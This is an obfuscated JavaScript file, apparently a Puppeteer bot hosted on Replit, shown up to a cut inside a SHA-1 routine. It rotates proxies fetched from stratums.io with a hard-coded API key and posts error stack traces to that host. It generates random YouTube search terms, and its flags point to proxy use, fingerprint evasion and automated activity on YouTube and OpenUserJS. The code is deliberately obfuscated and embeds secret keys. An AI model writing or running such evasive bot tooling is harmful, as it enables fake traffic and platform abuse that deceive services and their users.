function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x161 * -0x5 + 0x804 + -0x11f);
    let h = e[f];
    return h;
  }, d(b, c);
}
const aF = b,
  aE = d,
  aD = c;

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (0x8d6 + 0x1 * 0x9c5 + -0x129a))) + h;
}
async function randomWait() {
  return await wait(0x457 * 0x8 + 0x71 * -0x13 + -0x6cd + (-0x3 * -0x43d + -0xba7 * -0x2 + -0x107d) * random()), 0x81e * -0x2 + 0x1 * 0xf8a + 0x1 * 0xb3;
}

function randomFlush(f, g) {
  const h = f['length'];
  let i = floor(random() * h),
    j = arrs['get'](g);
  for (j || (j = new Set(), arrs['set'](g, j)); j['has'](i);)
    i = floor(random() * h);
  return j['add'](i), j['size'] === h && j['clear'](), f[i];
}

function extractLinks(f) {
  const g = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
  let h, i = [];
  for (; null !== (h = g['exec'](f));)
    h['index'] === g['lastIndex'] && g['lastIndex']++, h['forEach']((j, k) => {
      -0x13a + -0x473 + -0x5ae * -0x1 === k && i['push'](j);
    });
  return i;
}

function extractAnchorData(f) {
  const g = h => {
    const i = f['indexOf'](h + '=\x22');
    if (-(0x1d3e + 0x1f7 * 0xd + -0x4 * 0xdb2) === i)
      return null;
    const j = i + h['length'] + (0x2b5 + -0x9 * -0x95 + -0x7f0),
      k = f['indexOf']('\x22', j);
    return -(-0x13 * 0x89 + -0x12a5 + -0x1cd1 * -0x1) === k ? null : f['substring'](j, k);
  };
  return {
    'pingUrl': g('data-ping-' + 'url'),
    'scriptId': g('data-scrip' + 't-id'),
    'ipAddress': g('data-ip-ad' + 'dress'),
    'pingKey': g('data-ping-' + 'key')
  };
}
async function getSearchTerm() {
  return [
    ...(await fetch('https://ra' + 'pidtags.io' + '/api/gener' + 'ator?query' + '=' + _theAlphabet['random']() + ('&type=YouT' + 'ube'), {
      'credentials': 'omit',
      'headers': {
        'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '09.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '16.0',
        'Accept': 'applicatio' + 'n/json',
        'Accept-Language': 'en-US,en;q' + '=0.5',
        'Prefer': 'safe',
        'Alt-Used': 'rapidtags.' + 'io',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origi' + 'n'
      },
      'referrer': 'https://ra' + 'pidtags.io' + '/generator',
      'method': 'GET',
      'mode': 'cors'
    })['then'](f => f['json']()))['tags'],
    'zyenith',
    'zyenith\x20mi' + 'necraft',
    'minecraft\x20' + 'zyenith',
    'moomoo.io',
    'moomoo.io\x20' + 'spyder',
    'mrbeast',
    'pewdiepie',
    'quadeca',
    'urban\x20resc' + 'ue\x20ranch'
  ]['random']();
}

function a() {
  const cG = [
    'https://op',
    'W5ZcU3W1W45vWPamW5KM',
    'empo/EasyV',
    'lwnOyxqTz3b0lq',
    'EfjLywW',
    'length',
    'WOlcJmkutZJcMW',
    'yununeXKzhvUEa',
    'B3v0DwjLlwfKza',
    'zsXTAw5Ly3jHzG',
    'xlAEOkIuy7',
    'BI94AhrTBcT4Bq',
    'enuserjs.o',
    'nYvfnIvcqIvbna',
    'Dw5Ky2XVDwqUyW',
    'xuu3W6tdUMpdOmo7W7v6',
    'CMCVzw4VC2nYAq',
    'WRRcRCkpWP4',
    'W5LFW6dcP8o1za',
    'lu4DW6u1CbZdNmk5wW',
    'Mozilla/5.',
    'Kit/537.36',
    'too-much-e',
    'W6pcT8kXbCo+WQX9p8kkdq',
    'WQBdSmkEW4iSW5ZdR8kxWP4K',
    '-VgpSWWW-8',
    'pts/429746',
    'CMfJzq',
    'yXnZ',
    'B2nPywXFC2HHCG',
    'WR8gW7pcNq'
  ];
  a = function() {
    return cG;
  };
  return a();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x161 * -0x5 + 0x804 + -0x11f);
    let h = e[f];
    if (c['tLDPgJ'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x2535 + -0x1fca + -0x56b, r, s, t = 0x210e + -0x9 * -0x2d1 + -0x3a67 * 0x1; s = m['charAt'](t++); ~s && (r = q % (0x8d6 + 0x1 * 0x9c5 + -0x1297) ? r * (0x457 * 0x8 + 0x71 * -0x13 + -0x1a15) + s : s, q++ % (-0x3 * -0x43d + -0xba7 * -0x2 + -0x2401)) ? o += String['fromCharCode'](0x81e * -0x2 + 0x1 * 0xf8a + 0x1 * 0x1b1 & r >> (-(-0x13a + -0x473 + -0x1e5 * -0x3) * q & 0x1d3e + 0x1f7 * 0xd + -0x3 * 0x1241)) : 0x2b5 + -0x9 * -0x95 + -0x7f2) {
          s = n['indexOf'](s);
        }
        for (let u = -0x13 * 0x89 + -0x12a5 + -0xe68 * -0x2, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1c6e * 0x1 + -0x1100 + 0x2d7e))['slice'](-(-0x2 * 0xf6b + 0x153a + 0x99e));
        }
        return decodeURIComponent(p);
      };
      c['gXbpMb'] = i, b = arguments, c['tLDPgJ'] = !![];
    }
    const j = e[-0x73f + -0xe61 + 0x1 * 0x15a0],
      k = f + j,
      l = b[k];
    return !l ? (h = c['gXbpMb'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function isValidProxy(f) {
  return 'string' == typeof f && f['length'] > -0x1c6e * 0x1 + -0x1100 + 0x2d71 && f['includes'](':');
}
async function getRandomProxy() {
  for (;;) {
    const f = await fetch('https://st' + 'ratums.io/' + 'api/proxy/' + 'fetch?amt=' + '1&premium=' + 'yes&key=68' + 'dd383d6a62' + 'fb45684a02' + '1121959d15' + '06f8270066' + 'c62adc84aa' + 'a256e2b0e2' + '09')['then'](g => g['text']());
    if (isValidProxy(f))
      return f;
  }
}
const replUrl = 'https://' + process['env']['REPL_SLUG'] + '.' + process['env']['REPL_OWNER'] + '.repl.co',
  flags = {
    'ActivateBrowser': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_RPRT': 0x1,
    'RPL2_YT': 0x1,
    'doOUJS': 0x1,
    'doGF': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1,
    'doUseProxy': 0x1
  },
  {
    ElementHandle: ElementHandle,
    Page: Page,
    Frame: Frame,
    Browser: Browser
  } = require('puppeteer'),
  Check = (f => {
    function g(k = '') {
      return new Error()['stack'] || new Error()['toString']();
    }
    async function h(...k) {
      const l = [
          '[CH]\x20Cored' + 'ump:',
          ...k
        ]['join']('\x0a'),
        m = g();
      await async function(n) {
        const p = '18f9a0a514' + '8022de3150' + 'b78d2ef231' + '00b85393e4' + '67e20d4e39' + 'f791cb',
          q = 'https://st' + 'ratums.io/' + 'api/errorc' + 'ollect';
        if (((() => {
            try {
              return !!globalThis['process']['exit'];
            } catch (u) {
              return -0x2 * 0xf6b + 0x153a + 0x99c;
            }
          })())) {
          try {
            let u = require('axios');
            if (u)
              return void await u['post'](q, {
                'ekey': p,
                'message': n
              });
          } catch (v) {}
          try {
            let w = require('node-fetch');
            if (w)
              return void await w(q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (x) {}
          try {
            if (globalThis['fetch'])
              return void await globalThis['fetch'](q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (y) {}
        } else {
          try {
            if (globalThis['fetch'])
              return void await globalThis['fetch'](q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (z) {}
          try {
            if (globalThis['XMLHttpReq' + 'uest']) {
              const A = new globalThis['XMLHttpReq' + 'uest']();
              A['open']('POST', q), A['setRequest' + 'Header']('content-ty' + 'pe', 'applicatio' + 'n/json');
              let B = new Promise(C => {
                A['onload'] = () => C();
              });
              return A['send'](JSON['stringify']({
                'ekey': p,
                'message': n
              })), void await B;
            }
          } catch (C) {}
        }
      }(l + '\x0a' + m);
    }
    const i = Array['isArray'],
      j = {
        'info' (k) {
          h(k);
        },
        'dumpStackTrace': g,
        'cust': function(k, l) {
          try {
            l(k) || h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'idn': function(k) {
          try {
            'object' == typeof k && k['_isIdentit' + 'yType'] || h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'str': function(k) {
          const aB = b;
          try {
            'string' != typeof k && h('[CH]\x20Cored' + aB(0x11, 'IGTs'), k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'num': function(k) {
          try {
            'number' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'all': function(k, l) {
          try {
            k['some'](m => typeof m !== l) && h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'type': function(k, l) {
          try {
            if (typeof k == typeof l)
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'func': function(k) {
          try {
            'function' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'eq': function(k, l) {
          try {
            k !== l && h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'iface': function(k, l) {
          try {
            const m = Object['keys'](l);
            for (let n of m)
              k['hasOwnProp' + 'erty'](n) || h('[CH]\x20Cored' + 'ump:', m, k, l, 'searched\x20f' + 'or:', n), typeof k[n] != typeof l[n] && h('[CH]\x20Cored' + 'ump:', m, k, l, 'searched\x20f' + 'or:', n);
          } catch (p) {
            h('[CH]\x20Cored' + 'ump:', k, l, p);
          }
        },
        'prop': function(k, l) {
          try {
            if (i(l)) {
              for (let m of l)
                j['prop'](k, m);
            }
            if (k['hasOwnProp' + 'erty'](l))
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (n) {
            h('[CH]\x20Cored' + 'ump:', k, l, n);
          }
        },
        'inst': function(k, l) {
          try {
            if (k instanceof l)
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'ia': function(k, ...l) {
          try {
            for (let m of l)
              if (k instanceof m)
                return;
            h('[CH]\x20Cored' + 'ump:', k, ...l);
          } catch (n) {
            h('[CH]\x20Cored' + 'ump:', k, ...l, n);
          }
        },
        'arr': function(k) {
          try {
            if (i(k))
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k);
          }
        },
        'nes': function(k) {
          j['cust'](k, l => '' !== l), j['str'](k);
        },
        'bool': k => {
          try {
            if (-0x73f + -0xe61 + 0x1 * 0x15a1 == k)
              return;
            if (0x169c + 0x2 * -0x1233 + 0xdca == k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'truthy': k => {
          try {
            if (k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'nones': k => {
          try {
            if ('string' == typeof k && '' !== k || null === k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', l, k);
          }
        }
      };
    return j;
  })(),
  sha1 = ((() => {
    var e, f, g, h, i, j, k, l, m = 'object' == typeof window ? window : {},
      n = !m['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
    n && (m = global), e = ('0123456789' + 'abcdef')['split'](''), f = [-(-0xa410d56e * -0x1 + 0x1 * 0x2f52f832 + 0x868 * -0x9eb84),
      0x421f55 * 0x1 + -0x861568 + 0xc3f613, -0x6f * 0x138 + -0x2cab + -0x5 * -0x3d97, -0x1474 + -0x1 * 0x1f35 + -0x3429 * -0x1
    ], g = [
      0x1 * -0x135b + 0x18b9 * -0x1 + 0x2c2c,
      0xbad + 0x692 + -0x122f,
      0xb * -0x79 + 0x4 * 0x6ec + 0x1 * -0x1675,
      0x2 * -0x8e0 + -0x1899 * 0x1 + 0x2a59
    ], h = [
      'hex',
      'array',
      'digest',
      'arrayBuffe' + 'r'
    ], i = [], j = function(q) {
      return function(r) {
        return new o(-0x194 + 0x8e + 0x107)['update'](r)[q]();
      };
    }, k = function() {
      var q, s, u = j('hex');
      for (n && (u = l(u)), u['create'] = function() {
          return new o();
        }, u['update'] = function(v) {
          return u['create']()['update'](v);
        }, q = -0x1ac8 + -0x1 * 0x140c + 0x24 * 0x14d; q < h['length']; ++q)
        s = h[q], u[s] = j(s);
      return u;
    }, l = function(q) {
      var r = eval('require(\'crypto\');'),
        s = eval('require(\'buffer\')[\'Buffer\'];'),
        t = function(u) {
          const aC = b;
          if ('string' == typeof u)
            return r[aC(0x17, 'wY3J')]('sha1')['update'](u, 'utf8')['digest']('hex');
          if (u['constructo' + 'r'] === ArrayBuffer)
            u = new Uint8Array(u);
          else {
            if (void(0x409 + -0x1723 * 0x1 + 0x2 * 0x98d) === u['length'])
              return q(u);
          }
          return r['createHash']('sha1')['update'](new s(u))['digest']('hex');
        };
      return t;
    };
    class o {
      constructor(q) {
          q ? (i[0x1c3b + 0x130b + -0x2 * 0x17a3] = i[0x1658 + -0x198 + -0x14b0] = i[0x128c + 0x74e + -0x19d9 * 0x1] = i[-0x287 * -0x1 + -0x43 * -0x6d + -0x1f0c] = i[-0x12eb + 0x165e + -0x370] = i[-0x1f2c + -0xfa * -0x1c + 0x52 * 0xc] = i[-0x1d89 + -0x842 + -0xdc * -0x2c] = i[0x5 * -0x4cb + 0x2301 + -0x3 * 0x3ac] = i[-0x1ac1 + 0x81d * 0x1 + 0xb1 * 0x1b] = i[0x1eff + 0x4a3 + -0x15 * 0x1b2] = i[-0x1835 * -0x1 + 0x246 * -0x1 + -0x15e6] = i[-0x115 + -0x24bd + 0x25dc] = i[0x13 * -0x93 + 0x589 + 0x56b * 0x1] = i[-0x21 * 0xe + -0x2cb + 0x4a5] = i[0xfb * 0x18 + -0x1328 + -0x1 * 0x453] = i[-0x35 * -0x29 + 0x2037 + 0xf2 * -0x2b] = i[-0x88f + 0xe50 + -0xa2 * 0x9] = -0x1512 + 0xd52 + 0x10 * 0x7c, this['blocks'] = i) : this['blocks'] = [-0xe + -0x1083 * 0x1 + 0x1091,
            0x83e + 0x32 * -0x1c + 0x2c6 * -0x1, -0x5 * 0x63d + 0x9a2 + 0x158f, -0x24ab + -0x57 * 0x23 + 0x3090,
            0x78e + 0x26c8 + -0x2e56, -0x1022 + -0xc81 + 0x1ca3 * 0x1,
            0x151 * 0x8 + -0x1f17 + 0x1 * 0x148f,
            0x1 * -0x9 + -0x186b * -0x1 + 0x1862 * -0x1, -0x10c9 + 0xb10 + 0x5b9,
            0xae5 * -0x1 + 0x773 + 0x372, -0x759 + -0xea5 + -0x233 * -0xa, -0xab3 + -0x13d1 * 0x1 + -0xba * -0x2a,
            0x1 * -0x815 + 0x2e * 0x89 + -0x1089, -0x8db * 0x1 + -0x2 * 0x9ec + -0x4f * -0x5d, -0xf3 * -0x12 + 0x1 * -0xb03 + 0x137 * -0x5, -0x28a + -0x7 * -0x319 + -0x1325,
            0x1 * 0x207d + 0x711 + -0x278e
          ], this['h0'] = 0x25c94 * 0x3dee + -0x241beb72 + -0x6e04725, this['h1'] = -0x12060a476 + 0x2 * -0x5c8cfdc5 + 0x34d209 * 0xd81, this['h2'] = 0x291f0703 * 0x3 + 0x1017a7744 + -0xe41caf4f, this['h3'] = 0xed * -0x181fe8 + -0x17f79dea + 0x1a8 * 0x25bc11, this['h4'] = -0x404b * -0x391a6 + 0x2c4439ee * -0x1 + 0xaa1f03c, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x262a * 0x1 + -0x15d * 0xd + 0x1 * -0x1471, this['finalized'] = this['hashed'] = -0x8 * -0x3ce + 0x1 * -0xe95 + -0xfdb, this['first'] = -0x7 * 0x568 + -0x15e2 + 0x3 * 0x13e9;
        }
        ['update'](q) {
          var u, v, w, x, y, z;
          if (!this['finalized']) {
            for ((u = 'string' != typeof q) && q['constructo' + 'r'] === m['ArrayBuffe' + 'r'] && (q = new Uint8Array(q)), w = -0x3d * -0xa1 + 0xc * -0x22 + -0x24c5, y = q['length'] || -0x13a9 * -0x1 + -0xf * 0x19c + -0x47b * -0x1, z = this['blocks']; w < y;) {
              if (this['hashed'] && (this['hashed'] = 0x51 * -0x45 + 0x2 * -0x61 + 0x1 * 0x1697, z[-0x55c + -0x1715 * -0x1 + -0x11b9] = this['block'], z[-0x1e26 + -0x11ef * 0x1 + 0x1 * 0x3025] = z[-0x24d4 + 0x1 * -0x101c + 0x34f1] = z[-0x11ef + 0x1 * -0x829 + -0x1 * -0x1a1a] = z[-0x3d * -0x73 + 0x22f6 * 0x1 + -0x2 * 0x1f2d] = z[0x5e2 + -0x1182 + -0x1 * -0xba4] = z[0x1c9 * -0x2 + -0x117a + -0x1511 * -0x1] = z[0x2454 + 0xca6 + -0x30f4] = z[-0x8f6 + 0xaaf + -0x1b2] = z[-0x98e + -0x1cf * -0x6 + 0x6c * -0x3] = z[-0x14e + 0x1e62 + 0x5 * -0x5cf] = z[-0x1fce + 0x1883 + 0x755] = z[-0x1178 + 0x1 * 0xaf3 + 0x230 * 0x3] = z[-0x13b0 + 0x1b79 + 0x7 * -0x11b] = z[0x6 * 0x31a + 0x2388 + -0x3617] = z[-0x1663 + -0x733 * -0x1 + 0xf3e] = z[-0xfc2 + 0x1699 + -0x6c8] = 0x419 * 0x1 + -0x1219 + 0xe00 * 0x1), u) {
                for (x = this['start']; w < y && x < 0x183 * 0xb + -0x74b * 0x4 + 0xccb; ++w)
                  z[x >> 0x1 * -0xb75 + -0x1974 + 0x24eb] |= q[w] << g[-0x4 * 0x44f + 0xd2a + 0x415 & x++];
              } else {
                for (x = this['start']; w < y && x < 0x12e2 * -0x2 + -0x2 * -0x783 + 0xb7f * 0x2; ++w)
                  (v = q['charCodeAt'](w)) < 0x3 * 0xb0d + 0x17 * -0x71 + -0x1680 ? z[x >> -0x24d2 + -0x8 * 0xa0 + 0x14ea * 0x2] |= v << g[-0x885 * 0x3 + 0x4b * 0x15 + -0x679 * -0x3 & x++] : v < -0x1505 + 0x19e7 * -0x1 + 0x36ec ? (z[x >> -0x19 * -0x1a + 0x203a + 0x5cb * -0x6] |= (0xa1e + 0xb8d + -0x14eb | v >> 0x1f9 * 0x3 + -0x2235 + 0x1c50) << g[-0x1d1b + 0x197d + 0x3a1 & x++], z[x >> 0x1 * -0x6ed + -0x32 * 0x20 + -0x4b * -0x2d] |= (0x1add + 0x1 * 0x2501 + 0x2 * -0x1faf | -0xb * -0x313 + 0x637 + -0x27c9 * 0x1 & v) << g[0x55 * 0x6 + -0x422 + 0x227 & x++]) : v < 0x5 * -0x41 + -0x4 * 0x19c6 + 0x1405d || v >= 0x2 * -0x17a2 + 0x102b6 + 0xc8e ? (z[x >> -0x19b2 + 0x17 * 0x83 + 0x7b * 0x1d] |= (0xbee + 0x1fcd + -0x1 * 0x2adb | v >> 0x14b4 + 0x20bd + 0x1 * -0x3565) << g[-0xe35 * 0x1 + 0x1c80 + -0xe48 & x++], z[x >> -0xd * 0x209 + 0xb79 + -0xefe * -0x1] |= (0xcf3 * 0x2 + 0x4ea + 0x8 * -0x3ca | v >> 0x12ad + 0x13b1 + -0x2658 & -0x1b13 * 0x1 + 0x211 + 0x86b * 0x3) << g[-0x8ee * 0x1 + -0x1459 * 0x1 + 0x1d4a & x++], z[x >> 0x143 * 0x7 + 0x25b2 + -0x1 * 0x2e85] |= (0x1eb * 0x11 + 0x1 * -0x160f + -0x4 * 0x283 | 0x41 * -0x7a + 0x1 * 0x13a3 + 0xb96 & v) << g[-0x768 + 0x15b * -0x15 + -0x6 * -0x5fb & x++]) : (v = 0xf503 + -0x66a6 + 0x25e1 * 0x3 + ((-0x156f + -0x2a2 * -0x8 + 0x45e & v) << 0xb86 + 0x8fd + -0x1479 | 0x4 * 0x384 + -0x1f7e + 0x449 * 0x5 & q['charCodeAt'](++w)), z[x >> 0x1 * 0x1667 + 0x1e7 * 0xd + -0x2f20] |= (-0x167 * -0xf + -0x1 * 0x254f + 0x1136 | v >> -0x1 * -0xc79 + -0x1e * -0x89 + -0x9b * 0x2f) << g[-0x1f28 + -0xb * -0x2e3 + -0x96 & x++], z[x >> -0x3d1 * -0x4 + -0xaa1 * -0x1 + -0x19e3] |= (-0x1f1 * 0x8 + -0x1655 * 0x1 + 0x265d | v >> 0x1f26 + -0x2534 + -0x47 * -0x16 & 0x1035 + 0x1f * 0x23 + -0x1433 * 0x1) << g[0x193 + 0x918 + -0xaa8 & x++], z[x >> -0x4 * -0x241 + 0x2659 + -0x9 * 0x543] |= (-0x251c + 0x258b + 0x11 | v >> 0x2375 + -0x1154 + -0x121b & 0x93a * 0x3 + -0x1 * -0x5f9 + -0x10b4 * 0x2) << g[-0x3b5 + -0x1cde + 0x61 * 0x56 & x++], z[x >> 0xc56 * 0x3 + -0x24ff + 0x1 * -0x1] |= (0x1e8 * 0x11 + 0x2 * -0x4f + -0x1f4a | 0xee4 + 0xd8b + 0x70c * -0x4 & v) << g[-0x1 * 0x44b + -0x1d67 + -0x1 * -0x21b5 & x++]);
              }
              this['lastByteIn' + 'dex'] = x, this['bytes'] += x - this['start'], x >= 0x6ec + 0x1dc1 + -0x246d ? (this['block'] = z[-0x15d9 + 0xe8 + 0x1501 * 0x1], this['start'] = x - (-0x331 * 0x4 + -0xc5 * 0x25 + -0x22f * -0x13), this['hash'](), this['hashed'] = 0x2 * -0xf09 + -0xb6c + 0x297f) : this['start'] = x;
            }
            return this['bytes'] > -0x17 * 0x146629b1 + 0x1e6e6bfef + -0x443 * -0x37e93d && (this['hBytes'] += this['bytes'] / (0x239158 * 0x15c + 0x17877c824 + 0x1faf2d * -0x554) << 0x1 * 0x94d + 0x61a + -0xf67, this['bytes'] = this['bytes'] % (0x6 * -0x1621ed6 + 0x1789e634 + 0xf0c2d2d0)), this;
          }
        }
        ['finalize']() {
          if (!this['finalized']) {
            this['finalized'] = 0x1c6b + -0x12b9 * 0x1 + -0x9b1;
            var q = this['blocks'],
              r = this['lastByteIn' + 'dex'];
            q[-0xd * -0x141 + -0x18 * 0x1a0 + 0x16c3] = this['block'], q[r >> -0x1488 + -0x1e3b + -0x29 * -0x13d] |= f[0x6 * 0x2a6 + 0x993 + 0x1974 * -0x1 & r], this['block'] = q[0x1ebe + -0x1ea9 + -0x5], r >= 0x1594 + 0x354 * 0x4 + -0xe * 0x27a && (this['hashed'] || this['hash'](), q[-0x22a0 + -0x25b3 + 0x4853] = this['block'], q[-0x25 * 0x5d + -0x1f * 0x1d + -0x5ac * -0x3] = q[0x1 * -0x82f + 0x14 * 0x113 + -0xd4c] = q[0x7 * -0x3f3 + 0x1 * -0x1b91 + 0x1b9c * 0x2] = q[-0x1 * -0x1071 + -0x1e20 + -0x1 * -0xdb2] = q[-0x981 * 0x1 + 0x17e1 + -0xe5c] = q[0x2306 + 0x1321 + -0xa9 * 0x52] = q[-0x10a * -0x20 + -0xfbd + 0x1 * -0x117d] = q[0xf * 0x143 + 0x2ab * 0x1 + -0x1591] = q[0x17cb + -0xe58 + -0x1 * 0x96b] = q[0x1b * 0x9 + -0x1 * 0x1ed4 + 0x1 * 0x1dea] = q[-0x41 * 0x15 + 0x2b5 + 0x16 * 0x1f] = q[0xee0 + -0x2 * 0x644 + -0x24d] = q[0x7f1 * -0x3 + -0x1e65 + 0x97 * 0x5c] = q[-0x10 * -0x8d + 0x8 * 0x37d + 0x3f * -0x95] = q[-0x7cc * 0x1 + -0x2 * -0x1122 + 0x15 * -0x142] = q[0x2 * 0xbed + -0x26a1 * -0x1 + -0x3e6c] = -0x1336 * -0x2 + -0x8b * -0x43 + -0x4acd), q[-0x16 * 0x17f + 0x1e7 * -0x1 + 0x1 * 0x22df] = this['hBytes'] << 0x100a + -0x6 + -0x1001 * 0x1 | this['bytes'] >>> -0x2642 + -0x1cd * -0x13 + 0x10a * 0x4, q[-0x1ad6 + 0xb * -0x41 + 0x1db0] = this['bytes'] << 0x1203 + 0x1146 + -0x2346, this['hash']();
          }
        }
        ['hash']() {
          var q, u, v = this['h0'],
            w = this['h1'],
            x = this['h2'],
            y = this['h3'],
            z = this['h4'],
            A = this['blocks'];
          for (q = -0xb * -0x25f + -0xd8e + -0xc77; q < 0xbf5 * 0x1 + -0x11ab + 0x606; ++q)
            u = A[q - (0x1907 + -0x13c9 + -0x1 * 0x53b)] ^ A[q - (0xd * 0x169 + -0x19 * 0x81 + -0x5b4)] ^ A[q - (0x2531 + 0xe4e + -0x1 * 0x3371)] ^ A[q - (0x3 * 0xcb9 + 0x1312 + 0x1 * -0x392d)], A[q] = u << -0x1711 * -0x1 + 0x1a85 + 0x3 * -0x1087 | u >>> -0x1 * 0x2019 + 0x1 * 0x1105 + 0xf33 * 0x1;
          for (q = -0x34 * -0x1b + 0x1 * 0x16e1 + -0x1 * 0x1c5d; q < -0x1de7 + -0x6 * 0x229 + 0x2af1; q += -0x1fd * 0x7 + -0x832 + -0x2 * -0xb11)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0xaae + 0x2 * 0x32b + 0x45d | v >>> -0xc79 * 0x1 + 0x1a90 + -0xdfc) + (w & x | ~w & y) + z + (-0xced7193 * -0x4 + 0xa57a97fd * -0x1 + -0xcce * -0xff413) + A[q] << -0x1a64 + -0x1912 + -0x3ad * -0xe) << -0x5 * 0x14f + -0x3 * -0x895 + 0x132f * -0x1 | z >>> 0x1 * -0x2dd + 0xd * 0xc2 + 0x1 * -0x6e2) + (v & (w = w << -0x15e7 + 0x2 * 0x11c + 0x13cd | w >>> -0x4c1 * 0x1 + 0x1 * -0x2b5 + 0x778) | ~v & x) + y + (-0x3d54427 * -0x2a + 0x1 * -0x1a893a98 + 0x295bbe5 * -0x11) + A[q + (-0x1 * -0x14cb + -0xa3 * -0x29 + -0x2ee5)] << 0x29 * 0x6d + -0x225d + 0x10e8) << 0x1 * 0x55d + -0x1 * 0x1aa7 + 0x154f | y >>> 0xd18 + -0x1bef + -0x2 * -0x779) + (z & (v = v << 0x2 * 0x35a + 0x29 * 0xe9 + -0x2be7 * 0x1 | v >>> -0x2212 + -0x11 * -0x1aa + 0xd * 0x72) | ~z & w) + x + (-0x6ac6196a + -0xa7510fae + 0x16c99a2b1) + A[q + (-0x1ab6 + 0x149d + 0x61b * 0x1)] << -0x1d9b + 0x17f9 + 0x5a2) << 0xe91 + 0x89 * 0x1c + -0x1d88 | x >>> -0x1055 * -0x1 + -0x1c7d + -0x49 * -0x2b) + (y & (z = z << -0xe8a + 0x33 * -0x19 + 0xb * 0x1c9 | z >>> -0x644 * 0x1 + -0x6 * -0x664 + 0x66a * -0x5) | ~y & v) + w + (-0x4a807f * 0xd4 + 0x9fc186a5 + -0x78ca3e0) + A[q + (-0xf53 * 0x2 + -0x5f * 0x69 + -0x20 * -0x22d)] << 0x2 * 0x12cf + 0xfb0 * 0x2 + -0x44fe) << -0x4 * -0x142 + 0x5c4 + -0xac7 | w >>> -0xd37 + 0x1626 + -0x8d4) + (x & (y = y << -0xb5d + 0xe57 * 0x1 + -0x2dc | y >>> 0x2 * 0xfde + -0x1b51 + -0x469) | ~x & z) + v + (-0x8eaf731e + 0x1 * -0x640243fa + -0x5 * -0x42a409bd) + A[q + (-0x8e4 * -0x2 + -0xc * -0x324 + 0x27 * -0x16c)] << -0x2179 + 0xf91 + 0x23d * 0x8, x = x << 0x5 * 0x1 + -0x2705 + 0x271e | x >>> 0x21a + -0x12 * -0x89 + -0xbba;
          for (; q < 0xbe8 + -0x3 * -0xcfe + -0x32ba; q += 0x99b * -0x2 + -0x12 * 0x210 + -0x7 * -0x80d)
